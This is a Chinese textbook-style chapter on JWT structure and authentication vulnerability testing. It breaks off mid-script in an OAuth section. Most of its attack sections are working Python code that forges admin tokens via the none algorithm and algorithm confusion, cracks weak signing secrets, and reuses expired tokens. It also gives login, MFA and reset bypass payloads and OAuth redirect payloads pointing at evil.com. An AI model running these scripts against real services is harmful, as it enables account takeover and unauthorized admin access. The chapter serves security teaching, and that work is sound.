# 第12章 JWT与认证漏洞挖掘

## 12.1 JWT原理与结构

### 12.1.1 什么是JWT

JWT（JSON Web Token）是一种开放标准（RFC 7519），用于在各方之间以JSON对象的形式安全传输信息。JWT广泛应用于身份认证和信息交换场景，是目前最流行的Web认证机制之一。

**JWT的核心特点：**

| 特点 | 说明 |
|------|------|
| 自包含 | Token本身包含用户信息，无需额外查询 |
| 无状态 | 服务端无需存储Session，便于分布式部署 |
| 可验证 | 通过签名验证Token完整性 |
| 跨域支持 | 适合前后端分离和跨域场景 |
| 灵活性 | 可携带自定义声明信息 |

**JWT与其他认证方式的对比：**

| 认证方式 | 存储位置 | 状态 | 性能 | 安全性 |
|----------|----------|------|------|--------|
| Session | 服务端 | 有状态 | 需查询存储 | 较高 |
| Cookie | 客户端 | 有状态 | 需验证 | 中等 |
| JWT | 客户端 | 无状态 | 直接验证 | 中等 |
| OAuth Token | 客户端 | 无状态 | 需验证 | 较高 |

### 12.1.2 JWT结构详解

JWT由三部分组成，用点号（.）分隔：

```
Header.Payload.Signature
```

**1. Header（头部）**

Header包含Token的元数据，通常包括：
- `alg`：签名算法（如HS256、RS256）
- `typ`：Token类型（通常为JWT）

```json
{
    "alg": "HS256",
    "typ": "JWT"
}
```

Header经过Base64Url编码后形成JWT的第一部分。

**2. Payload（载荷）**

Payload包含声明（Claims），分为三类：

| 类型 | 说明 | 示例 |
|------|------|------|
| 注册声明 | 预定义的标准声明 | iss、sub、aud、exp、nbf、iat、jti |
| 公共声明 | 可自定义的声明 | name、email、role |
| 私有声明 | 自定义的私有声明 | 自定义业务数据 |

**标准声明详解：**

| 声明 | 全称 | 说明 |
|------|------|------|
| iss | Issuer | Token签发者 |
| sub | Subject | Token主题（通常是用户ID） |
| aud | Audience | Token接收者 |
| exp | Expiration Time | 过期时间 |
| nbf | Not Before | 生效时间 |
| iat | Issued At | 签发时间 |
| jti | JWT ID | Token唯一标识 |

```json
{
    "iss": "example.com",
    "sub": "1234567890",
    "aud": "app.example.com",
    "exp": 1516239022,
    "nbf": 1516239022,
    "iat": 1516239022,
    "jti": "unique-id-123",
    "name": "John Doe",
    "email": "john@example.com",
    "role": "admin"
}
```

Payload经过Base64Url编码后形成JWT的第二部分。

**3. Signature（签名）**

签名用于验证Token的完整性和真实性。签名算法取决于Header中指定的alg字段。

**签名生成过程：**

```
HMACSHA256(
    base64UrlEncode(header) + "." + base64UrlEncode(payload),
    secret
)
```

对于RS256等非对称算法：

```
RSASHA256(
    base64UrlEncode(header) + "." + base64UrlEncode(payload),
    privateKey
)
```

### 12.1.3 JWT完整示例

**原始JWT：**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**解码分析：**

```python
import base64
import json

jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

parts = jwt_token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
signature = parts[2]

print("Header:", header)
print("Payload:", payload)
print("Signature:", signature)
```

输出：

```
Header: {'alg': 'HS256', 'typ': 'JWT'}
Payload: {'sub': '1234567890', 'name': 'John Doe', 'iat': 1516239022}
Signature: SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### 12.1.4 JWT工作流程

**认证流程：**

1. 用户登录，提交用户名和密码
2. 服务端验证凭证，生成JWT
3. 服务端返回JWT给客户端
4. 客户端存储JWT（通常在localStorage或Cookie）
5. 后续请求携带JWT（通常在Authorization头）
6. 服务端验证JWT签名和有效期
7. 服务端提取用户信息，处理请求

**请求示例：**

```http
GET /api/v1/users HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**服务端验证流程：**

```python
from flask_jwt_extended import jwt_required, get_jwt_identity

@app.route('/api/v1/users')
@jwt_required()
def get_users():
    # JWT已验证，提取用户信息
    current_user_id = get_jwt_identity()
    # 业务逻辑
    return jsonify(users=get_users_by_id(current_user_id))
```

## 12.2 JWT漏洞挖掘实战过程

### 12.2.1 信息收集阶段

**1. 获取JWT Token**

```python
import requests

def get_jwt_token(target_url, credentials):
    """获取目标JWT Token"""
    login_endpoints = [
        "/login",
        "/api/login",
        "/api/v1/login",
        "/auth/login",
        "/oauth/token",
        "/api/auth"
    ]
    
    for endpoint in login_endpoints:
        full_url = f"{target_url}{endpoint}"
        
        # 尝试POST请求
        try:
            response = requests.post(full_url, json=credentials)
            if response.status_code == 200:
                data = response.json()
                
                # 检查常见的Token字段
                token_fields = ['token', 'access_token', 'jwt', 'auth_token']
                for field in token_fields:
                    if field in data:
                        print(f"[+] 成功获取Token: {data[field][:50]}...")
                        return data[field]
                
                # 检查Cookie
                if 'Set-Cookie' in response.headers:
                    cookie = response.headers['Set-Cookie']
                    if 'token' in cookie.lower():
                        print(f"[+] 在Cookie中找到Token")
                        return cookie
        except:
            continue
    
    print("[-] 未找到JWT Token")
    return None

# 使用示例
token = get_jwt_token("https://target.example.com", {"username": "user", "password": "password"})
```

**2. 分析JWT结构**

```python
import base64
import json

def analyze_jwt(token):
    """分析JWT结构"""
    parts = token.split('.')
    
    if len(parts) != 3:
        print("[-] 无效的JWT格式")
        return None
    
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    signature = parts[2]
    
    print("=== JWT分析结果 ===")
    print(f"[*] 算法: {header.get('alg', '未知')}")
    print(f"[*] 类型: {header.get('typ', '未知')}")
    print(f"[*] 签名长度: {len(signature)} 字符")
    print(f"[*] Payload字段: {list(payload.keys())}")
    
    # 检查敏感信息
    sensitive_fields = ['password', 'secret', 'key', 'credit_card']
    for field in sensitive_fields:
        if field in payload:
            print(f"[!] 发现敏感字段: {field}")
    
    # 检查过期时间
    if 'exp' in payload:
        import time
        exp_time = payload['exp']
        current_time = int(time.time())
        if exp_time < current_time:
            print(f"[!] Token已过期 ({exp_time} < {current_time})")
        else:
            print(f"[*] Token有效期: {exp_time - current_time} 秒")
    
    return {"header": header, "payload": payload, "signature": signature}

# 使用示例
analysis = analyze_jwt(token)
```

**3. 查找密钥信息**

```python
def find_jwt_keys(target_url):
    """查找JWT密钥相关信息"""
    key_endpoints = [
        "/.well-known/jwks.json",
        "/jwks.json",
        "/api/jwks",
        "/oauth/jwks",
        "/.well-known/openid-configuration",
        "/public-key",
        "/keys"
    ]
    
    found_keys = []
    
    for endpoint in key_endpoints:
        try:
            response = requests.get(f"{target_url}{endpoint}")
            if response.status_code == 200:
                data = response.json()
                
                if 'keys' in data:
                    for key in data['keys']:
                        if key.get('kty') == 'RSA':
                            print(f"[+] 发现RSA公钥")
                            found_keys.append(key)
                        elif key.get('kty') == 'EC':
                            print(f"[+] 发现EC公钥")
                            found_keys.append(key)
                elif 'public_key' in data:
                    print(f"[+] 发现公钥")
                    found_keys.append(data['public_key'])
                    
        except:
            continue
    
    return found_keys

# 使用示例
keys = find_jwt_keys("https://target.example.com")
```

### 12.2.2 漏洞检测阶段

**1. 测试none算法**

```python
def test_none_algorithm(token, test_url):
    """测试none算法漏洞"""
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # 修改Payload为管理员
    payload['role'] = 'admin'
    payload['sub'] = 'admin'
    
    # 测试多种none变体
    none_variants = ['none', 'None', 'NONE', 'nOnE', '', 'null']
    
    for variant in none_variants:
        test_header = {"alg": variant, "typ": "JWT"}
        
        header_encoded = base64.urlsafe_b64encode(json.dumps(test_header).encode()).decode().rstrip('=')
        payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        
        # 测试多种签名格式
        test_tokens = [
            f"{header_encoded}.{payload_encoded}.",
            f"{header_encoded}.{payload_encoded}",
            f"{header_encoded}.{payload_encoded}.invalid"
        ]
        
        for test_token in test_tokens:
            headers = {"Authorization": f"Bearer {test_token}"}
            response = requests.get(test_url, headers=headers)
            
            if response.status_code == 200:
                print(f"[!] none算法漏洞成功: alg={variant}")
                print(f"    Token: {test_token}")
                return True
    
    return False

# 使用示例
test_none_algorithm(token, "https://target.example.com/api/admin")
```

**2. 测试算法混淆**

```python
def test_algorithm_confusion(token, public_key, test_url):
    """测试算法混淆漏洞"""
    parts = token.split('.')
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # 修改Payload
    payload['role'] = 'admin'
    
    header = {"alg": "HS256", "typ": "JWT"}
    header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    
    # 使用公钥作为HS256密钥签名
    message = f"{header_encoded}.{payload_encoded}"
    signature = hmac.new(public_key.encode(), message.encode(), hashlib.sha256).digest()
    signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    
    malicious_token = f"{header_encoded}.{payload_encoded}.{signature_encoded}"
    
    headers = {"Authorization": f"Bearer {malicious_token}"}
    response = requests.get(test_url, headers=headers)
    
    if response.status_code == 200:
        print(f"[!] 算法混淆漏洞成功")
        print(f"    Token: {malicious_token}")
        return True
    
    return False

# 使用示例
test_algorithm_confusion(token, public_key_pem, "https://target.example.com/api/admin")
```

**3. 测试过期验证**

```python
def test_expiration_bypass(token, test_url):
    """测试过期验证缺失"""
    parts = token.split('.')
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # 修改过期时间为过去
    payload['exp'] = 0  # Unix时间戳0，已过期
    
    # 重新编码
    header_encoded = parts[0]
    payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    
    # 使用原签名（如果签名验证严格则会失败）
    expired_token = f"{header_encoded}.{payload_encoded}.{parts[2]}"
    
    headers = {"Authorization": f"Bearer {expired_token}"}
    response = requests.get(test_url, headers=headers)
    
    if response.status_code == 200:
        print(f"[!] 过期验证缺失漏洞")
        print(f"    Token: {expired_token}")
        return True
    
    # 测试完全移除exp字段
    payload.pop('exp', None)
    payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    no_exp_token = f"{header_encoded}.{payload_encoded}.{parts[2]}"
    
    headers = {"Authorization": f"Bearer {no_exp_token}"}
    response = requests.get(test_url, headers=headers)
    
    if response.status_code == 200:
        print(f"[!] 缺少exp字段验证漏洞")
        return True
    
    return False

# 使用示例
test_expiration_bypass(token, "https://target.example.com/api/users")
```

### 12.2.3 漏洞验证与利用

**1. 构造恶意Token**

```python
def create_malicious_token(token, algorithm, secret=None, modifications=None):
    """构造恶意JWT Token"""
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # 修改算法
    header['alg'] = algorithm
    
    # 应用修改
    if modifications:
        payload.update(modifications)
    
    # 编码
    header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    
    # 生成签名
    message = f"{header_encoded}.{payload_encoded}"
    
    if algorithm == 'none':
        signature_encoded = ''
    elif algorithm.startswith('HS'):
        hash_alg = getattr(hashlib, f"sha{algorithm[2:]}")
        signature = hmac.new(secret.encode(), message.encode(), hash_alg).digest()
        signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    else:
        # 非对称算法需要私钥
        return None
    
    return f"{header_encoded}.{payload_encoded}.{signature_encoded}"

# 使用示例
malicious_token = create_malicious_token(
    token, 
    'HS256', 
    secret=secret_key,
    modifications={'role': 'admin', 'sub': 'admin'}
)
```

**2. 验证权限提升**

```python
def verify_privilege_escalation(malicious_token, test_url):
    """验证权限提升"""
    headers = {"Authorization": f"Bearer {malicious_token}"}
    
    admin_endpoints = [
        "/api/admin",
        "/api/admin/users",
        "/api/admin/config",
        "/api/v1/admin/dashboard",
        "/manage/users"
    ]
    
    for endpoint in admin_endpoints:
        full_url = f"{test_url}{endpoint}"
        response = requests.get(full_url, headers=headers)
        
        if response.status_code == 200:
            print(f"[+] 成功访问管理员接口: {endpoint}")
            print(f"    响应长度: {len(response.text)}")
            
            # 检查是否包含敏感信息
            sensitive_keywords = ['password', 'secret', 'token', 'admin']
            for keyword in sensitive_keywords:
                if keyword in response.text.lower():
                    print(f"    [!] 响应中包含敏感词: {keyword}")
            
            return True
    
    return False

# 使用示例
verify_privilege_escalation(malicious_token, "https://target.example.com")
```

## 12.3 JWT漏洞类型详解

### 12.3.1 漏洞概述

JWT安全问题主要源于实现缺陷和配置不当。常见的JWT漏洞类型包括：

| 漏洞类型 | 严重程度 | 说明 |
|----------|----------|------|
| 算法None漏洞 | 高 | 使用none算法绕过签名验证 |
| 算法混淆漏洞 | 高 | HS256与RS256混淆攻击 |
| 密钥泄露 | 高 | 签名密钥泄露或可预测 |
| 密钥爆破 | 中 | 弱密钥可被爆破 |
| 信息泄露 | 低 | Payload包含敏感信息 |
| 过期验证缺失 | 高 | 未验证exp声明 |
| 签名绕过 | 高 | 签名验证逻辑缺陷 |
| Token重放 | 中 | Token过期后仍可用 |
| JWT注入 | 中 | Payload注入攻击 |

### 12.3.2 算法None漏洞

**漏洞原理：**

JWT规范允许使用"none"算法，表示Token不使用签名。如果服务端未正确限制算法类型，攻击者可构造无签名的JWT。

**攻击示例：**

```python
import base64
import json

# 构造恶意Header
header = {
    "alg": "none",
    "typ": "JWT"
}

# 构造恶意Payload
payload = {
    "sub": "admin",
    "name": "Administrator",
    "role": "admin",
    "iat": 1516239022
}

# 编码
header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# 构造无签名JWT
jwt_token = f"{header_encoded}.{payload_encoded}."

print("恶意JWT:", jwt_token)
```

**变体攻击：**

```python
# 变体1：alg为None（大写）
header = {"alg": "None", "typ": "JWT"}

# 变体2：alg为NONE（全大写）
header = {"alg": "NONE", "typ": "JWT"}

# 变体3：alg为nOnE（混合大小写）
header = {"alg": "nOnE", "typ": "JWT"}

# 变体4：添加空签名
jwt_token = f"{header_encoded}.{payload_encoded}"

# 变体5：添加任意签名
jwt_token = f"{header_encoded}.{payload_encoded}.invalid_signature"
```

**检测方法：**

```python
import requests

def test_none_algorithm(url, valid_token):
    # 解码原始Token
    parts = valid_token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # 修改Payload为管理员
    payload['role'] = 'admin'
    payload['sub'] = 'admin'
    
    # 构造none算法Token
    none_variants = ['none', 'None', 'NONE', 'nOnE']
    
    for variant in none_variants:
        header['alg'] = variant
        header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
        
        test_tokens = [
            f"{header_encoded}.{payload_encoded}.",
            f"{header_encoded}.{payload_encoded}",
            f"{header_encoded}.{payload_encoded}.invalid"
        ]
        
        for token in test_tokens:
            headers = {"Authorization": f"Bearer {token}"}
            response = requests.get(url, headers=headers)
            
            if response.status_code == 200:
                print(f"[!] none算法漏洞成功: {variant}")
                print(f"    Token: {token}")
                return True
    
    return False

# 使用示例
test_none_algorithm("https://api.example.com/api/v1/admin", valid_token)
```

### 12.2.3 算法混淆漏洞

**漏洞原理：**

当服务端使用RS256（非对称算法）签名JWT时，如果攻击者将算法改为HS256（对称算法），并使用公钥作为HS256的密钥，可能绕过签名验证。

**攻击流程：**

1. 获取服务端公钥（通常可从/jwks.json或证书获取）
2. 构造恶意JWT，将alg改为HS256
3. 使用公钥作为HS256密钥签名
4. 服务端使用公钥验证HS256签名，验证通过

**攻击实现：**

```python
import base64
import json
import hmac
import hashlib

def algorithm_confusion_attack(public_key, payload):
    # 构造Header，使用HS256算法
    header = {
        "alg": "HS256",
        "typ": "JWT"
    }
    
    # 编码Header和Payload
    header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    
    # 使用公钥作为HS256密钥签名
    message = f"{header_encoded}.{payload_encoded}"
    signature = hmac.new(
        public_key.encode(),
        message.encode(),
        hashlib.sha256
    ).digest()
    signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    
    # 构造恶意JWT
    jwt_token = f"{header_encoded}.{payload_encoded}.{signature_encoded}"
    return jwt_token

# 使用示例
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAn...
-----END PUBLIC KEY-----"""

payload = {
    "sub": "admin",
    "role": "admin",
    "iat": 1516239022
}

malicious_token = algorithm_confusion_attack(public_key, payload)
print("恶意JWT:", malicious_token)
```

**获取公钥的方法：**

```python
import requests

def get_public_key(url):
    # 从JWKS端点获取
    jwks_urls = [
        "/jwks.json",
        "/.well-known/jwks.json",
        "/api/jwks",
        "/openid-configuration"
    ]
    
    for jwks_path in jwks_urls:
        response = requests.get(f"{url}{jwks_path}")
        if response.status_code == 200:
            data = response.json()
            if 'keys' in data:
                # 提取公钥
                for key in data['keys']:
                    if key['kty'] == 'RSA':
                        n = key['n']
                        e = key['e']
                        # 构造公钥
                        return construct_rsa_public_key(n, e)
    
    # 从证书获取
    response = requests.get(url, verify=False)
    # 提取证书中的公钥
    # ...
    
    return None

# 使用示例
public_key = get_public_key("https://api.example.com")
```

### 12.2.4 密钥爆破漏洞

**漏洞原理：**

如果JWT使用弱密钥（如短密码、常见密码），攻击者可尝试爆破密钥，伪造有效JWT。

**常见弱密钥列表：**

```
secret
password
123456
admin
key
jwt_secret
your-256-bit-secret
your-384-bit-secret
your-512-bit-secret
```

**爆破工具：**

```bash
# 使用jwt-cracker
npm install -g jwt-cracker
jwt-cracker <token> <alphabet> <max-length>

# 使用hashcat
hashcat -m 16500 jwt.txt -a 3 ?a?a?a?a?a?a

# 使用john
john --format=HMAC-SHA256 jwt.txt
```

**Python爆破实现：**

```python
import hmac
import hashlib
import base64
import json

def crack_jwt_secret(jwt_token, wordlist):
    parts = jwt_token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload_encoded = parts[1]
    signature = parts[2]
    
    message = f"{parts[0]}.{parts[1]}"
    
    for secret in wordlist:
        calculated_sig = hmac.new(
            secret.encode(),
            message.encode(),
            hashlib.sha256
        ).digest()
        calculated_sig_encoded = base64.urlsafe_b64encode(calculated_sig).decode().rstrip('=')
        
        if calculated_sig_encoded == signature:
            print(f"[+] 密钥破解成功: {secret}")
            return secret
    
    print("[!] 密钥破解失败")
    return None

# 使用示例
jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
wordlist = ["secret", "password", "123456", "admin", "key"]
cracked_secret = crack_jwt_secret(jwt_token, wordlist)
```

### 12.2.5 信息泄露漏洞

**漏洞类型：**

1. **敏感信息存储在Payload**

```json
{
    "sub": "1234567890",
    "password": "admin123",  // 敏感信息
    "credit_card": "1234567890123456",  // 敏感信息
    "api_key": "sk_live_xxx",  // 敏感信息
    "ssn": "123-45-6789"  // 敏感信息
}
```

2. **用户信息过度暴露**

```json
{
    "sub": "1234567890",
    "name": "John Doe",
    "email": "john@example.com",
    "phone": "13800138000",
    "address": "北京市朝阳区xxx",
    "id_card": "110101199001011234"
}
```

**检测方法：**

```python
import base64
import json

def analyze_jwt_payload(jwt_token):
    parts = jwt_token.split('.')
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # 检查敏感字段
    sensitive_fields = [
        'password', 'passwd', 'pwd',
        'credit_card', 'card_number',
        'api_key', 'apikey', 'secret', 'key',
        'ssn', 'social_security',
        'id_card', 'identity_card',
        'phone', 'mobile', 'telephone',
        'address', 'addr'
    ]
    
    found_sensitive = []
    for field in sensitive_fields:
        if field in payload:
            found_sensitive.append({
                'field': field,
                'value': payload[field]
            })
    
    if found_sensitive:
        print("[!] JWT包含敏感信息:")
        for item in found_sensitive:
            print(f"    {item['field']}: {item['value']}")
    
    return found_sensitive

# 使用示例
analyze_jwt_payload("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...")
```

### 12.2.6 过期验证缺失

**漏洞原理：**

如果服务端未验证JWT的exp（过期时间）声明，攻击者可使用过期Token继续访问。

**检测方法：**

```python
import requests
import time

def test_expired_token(url, token):
    # 解码Token查看过期时间
    parts = token.split('.')
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    if 'exp' in payload:
        exp_time = payload['exp']
        current_time = int(time.time())
        
        if current_time > exp_time:
            print(f"[*] Token已过期: {exp_time}")
            print(f"[*] 当前时间: {current_time}")
            
            # 尝试使用过期Token
            headers = {"Authorization": f"Bearer {token}"}
            response = requests.get(url, headers=headers)
            
            if response.status_code == 200:
                print("[!] 过期验证缺失漏洞")
                return True
            else:
                print("[*] Token过期验证正常")
                return False
    else:
        print("[!] Token未设置过期时间")
        return True

# 使用示例
test_expired_token("https://api.example.com/api/v1/users", expired_token)
```

### 12.3.7 签名绕过漏洞

**漏洞类型：**

1. **签名验证逻辑缺陷**

```python
# 错误示例：仅检查签名是否存在
def verify_jwt(token):
    parts = token.split('.')
    if len(parts) != 3:
        return False
    # 未验证签名正确性
    return True

# 正确示例：验证签名
def verify_jwt(token, secret):
    parts = token.split('.')
    if len(parts) != 3:
        return False
    
    message = f"{parts[0]}.{parts[1]}"
    expected_sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    actual_sig = base64.urlsafe_b64decode(parts[2] + '==')
    
    return hmac.compare_digest(expected_sig, actual_sig)
```

2. **类型混淆绕过**

```python
# 错误示例：使用==比较
if signature == expected_signature:
    return True

# 正确示例：使用hmac.compare_digest
if hmac.compare_digest(signature, expected_signature):
    return True
```

## 12.4 认证绕过

### 12.4.1 JWT认证绕过

**绕过方法汇总：**

| 方法 | 原理 | 适用场景 |
|------|------|----------|
| none算法 | 无签名验证 | 服务端未限制算法 |
| 算法混淆 | HS256用公钥签名 | 服务端使用RS256 |
| 密钥爆破 | 爆破签名密钥 | 弱密钥 |
| 签名绕过 | 验证逻辑缺陷 | 实现错误 |
| Token伪造 | 已知密钥伪造 | 密钥泄露 |
| 过期绕过 | 未验证exp | 验证缺失 |

**综合检测脚本：**

```python
import requests
import base64
import json
import hmac
import hashlib

class JWTSecurityTester:
    def __init__(self, url, token):
        self.url = url
        self.token = token
        self.parts = token.split('.')
        self.header = json.loads(base64.urlsafe_b64decode(self.parts[0] + '=='))
        self.payload = json.loads(base64.urlsafe_b64decode(self.parts[1] + '=='))
    
    def test_none_algorithm(self):
        """测试none算法漏洞"""
        variants = ['none', 'None', 'NONE']
        
        for variant in variants:
            test_header = {"alg": variant, "typ": "JWT"}
            test_payload = {**self.payload, "role": "admin"}
            
            header_encoded = base64.urlsafe_b64encode(json.dumps(test_header).encode()).decode().rstrip('=')
            payload_encoded = base64.urlsafe_b64encode(json.dumps(test_payload).encode()).decode().rstrip('=')
            
            test_token = f"{header_encoded}.{payload_encoded}."
            headers = {"Authorization": f"Bearer {test_token}"}
            
            response = requests.get(self.url, headers=headers)
            if response.status_code == 200:
                return {"vulnerability": "none算法", "success": True, "token": test_token}
        
        return {"vulnerability": "none算法", "success": False}
    
    def test_expired_token(self):
        """测试过期验证"""
        headers = {"Authorization": f"Bearer {self.token}"}
        response = requests.get(self.url, headers=headers)
        
        if response.status_code == 200:
            return {"vulnerability": "过期验证缺失", "success": True}
        return {"vulnerability": "过期验证缺失", "success": False}
    
    def test_weak_key(self, wordlist):
        """测试弱密钥"""
        message = f"{self.parts[0]}.{self.parts[1]}"
        
        for secret in wordlist:
            sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            sig_encoded = base64.urlsafe_b64encode(sig).decode().rstrip('=')
            
            if sig_encoded == self.parts[2]:
                return {"vulnerability": "弱密钥", "success": True, "secret": secret}
        
        return {"vulnerability": "弱密钥", "success": False}
    
    def run_all_tests(self, wordlist):
        """运行所有测试"""
        results = []
        
        results.append(self.test_none_algorithm())
        results.append(self.test_expired_token())
        results.append(self.test_weak_key(wordlist))
        
        return results

# 使用示例
tester = JWTSecurityTester("https://api.example.com/api/v1/admin", valid_token)
results = tester.run_all_tests(["secret", "password", "123456"])

for result in results:
    if result["success"]:
        print(f"[!] 发现漏洞: {result['vulnerability']}")
```

### 12.4.2 Session固定攻击

**漏洞原理：**

Session固定攻击是指攻击者强制用户使用预知的Session ID，从而在用户登录后获取其会话。

**攻击流程：**

1. 攻击者获取一个有效的Session ID
2. 攻击者诱导受害者使用该Session ID
3. 受害者登录，Session ID关联受害者的身份
4. 攻击者使用相同Session ID访问受害者账户

**攻击示例：**

```http
# 步骤1：攻击者获取Session ID
GET /login HTTP/1.1
Host: target.example.com

# 响应
HTTP/1.1 200 OK
Set-Cookie: session=attacker_session_id

# 步骤2：诱导受害者使用该Session ID
# 发送链接：https://target.example.com/login?session=attacker_session_id

# 步骤3：受害者登录
POST /login HTTP/1.1
Host: target.example.com
Cookie: session=attacker_session_id

username=victim&password=victim_password

# 步骤4：攻击者使用相同Session ID
GET /account HTTP/1.1
Host: target.example.com
Cookie: session=attacker_session_id
```

**检测方法：**

```python
import requests

def test_session_fixation(url):
    # 获取初始Session
    response1 = requests.get(f"{url}/login")
    initial_session = response1.cookies.get('session')
    print(f"[*] 初始Session: {initial_session}")
    
    # 使用初始Session登录
    login_data = {"username": "test", "password": "test"}
    response2 = requests.post(
        f"{url}/login",
        data=login_data,
        cookies={"session": initial_session}
    )
    
    # 检查Session是否更新
    new_session = response2.cookies.get('session')
    
    if new_session == initial_session:
        print("[!] Session固定漏洞：登录后Session未更新")
        return True
    else:
        print("[*] Session已更新，安全")
        return False

# 使用示例
test_session_fixation("https://target.example.com")
```

**防护措施：**

```python
from flask import session
import secrets

@app.route('/login', methods=['POST'])
def login():
    # 验证用户凭证
    user = authenticate(request.form['username'], request.form['password'])
    
    if user:
        # 登录成功后重新生成Session ID
        session.clear()  # 清除旧Session
        session['user_id'] = user.id
        session['new_session_id'] = secrets.token_hex(16)  # 生成新Session ID
        
        return jsonify(success=True)
    
    return jsonify(error="认证失败"), 401
```

### 12.4.3 认证逻辑绕过

**常见绕过方法：**

1. **登录逻辑绕过**

```http
# 正常登录
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": "password123"}

# 尝试绕过
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": "password123", "bypass": true}

# 或
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": ["password123", "any_password"]}
```

2. **密码重置绕过**

```http
# 正常流程
POST /reset-password HTTP/1.1
Content-Type: application/json

{"email": "victim@example.com"}

# 响应：发送验证码到邮箱
{"message": "验证码已发送"}

# 绕过尝试
POST /reset-password HTTP/1.1
Content-Type: application/json

{"email": "victim@example.com", "token": "bypass", "new_password": "hacked123"}
```

3. **多因素认证绕过**

```http
# 正常流程
POST /verify-mfa HTTP/1.1
Content-Type: application/json

{"code": "123456"}

# 绕过尝试
POST /verify-mfa HTTP/1.1
Content-Type: application/json

{"code": "123456", "mfa_bypass": true}

# 或
POST /verify-mfa HTTP/1.1
Content-Type: application/json

{"code": null}
```

**检测脚本：**

```python
import requests

def test_auth_bypass(url):
    bypass_payloads = [
        {"username": "admin", "password": "wrong", "bypass": True},
        {"username": "admin", "password": "wrong", "admin": True},
        {"username": "admin", "password": "wrong", "role": "admin"},
        {"username": "admin", "password": ["wrong", "correct"]},
        {"username": "admin", "password": None},
        {"username": "admin"},
    ]
    
    for payload in bypass_payloads:
        response = requests.post(f"{url}/login", json=payload)
        
        if response.status_code == 200 and "token" in response.json():
            print(f"[!] 认证绕过成功: {payload}")
            return True
    
    return False

# 使用示例
test_auth_bypass("https://api.example.com/login")
```

### 12.4.4 OAuth认证绕过

**常见OAuth漏洞：**

1. **CSRF攻击**

```http
# 攻击者构造恶意请求
https://auth.example.com/authorize?
    response_type=code&
    client_id=attacker_client&
    redirect_uri=https://attacker.com/callback&
    scope=all&
    state=fixed_state

# 受害者点击链接，授权攻击者的应用
# 攻击者获取授权码，访问受害者的资源
```

2. **开放重定向**

```http
https://auth.example.com/authorize?
    response_type=code&
    client_id=valid_client&
    redirect_uri=https://app.example.com/callback/../attacker.com
```

3. **Token泄露**

```http
# Token通过URL参数传递
https://app.example.com/callback?access_token=xxx

# 可通过Referer头或浏览器历史记录泄露
```

**检测方法：**

```python
import requests

def test_oauth_security(auth_url, client_id):
    # 测试开放重定向
    redirect_payloads = [
        "https://evil.com",
        "https://app.example.com.evil.com",
        "https://app.example.com@evil.com",
        "//evil.com",
        "https://app.example.com/callback?url=https://evil.com"
    ]
    
    for redirect in redirect_payloads:
        params = {
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": redirect
        }
        
        response = requests.get(auth_url, params=params, allow_redirects=False)
        
        if response.status_code in [301, 302]:
            location = response.headers.get("Location", "")
            if "evil.com" in location:
